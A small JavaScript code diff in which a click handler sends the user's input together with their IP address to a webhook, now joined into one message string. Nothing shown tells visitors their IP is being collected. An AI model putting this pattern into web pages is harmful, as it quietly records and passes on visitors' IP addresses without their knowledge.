@@ -8,8 +8,7 @@ document.getElementById("irofb5").addEventListener("click", function() {
         .then(data => {
             const userIP = data.ip; // Get the IP address from the response
             const messageContent = {
-                content: userInput,
-                user_ip: userIP // Include the IP address in the message
+                content: `User Input: ${userInput}, User IP: ${userIP}` // Include the IP address in the message
             };
 
             fetch(webhookURL, {
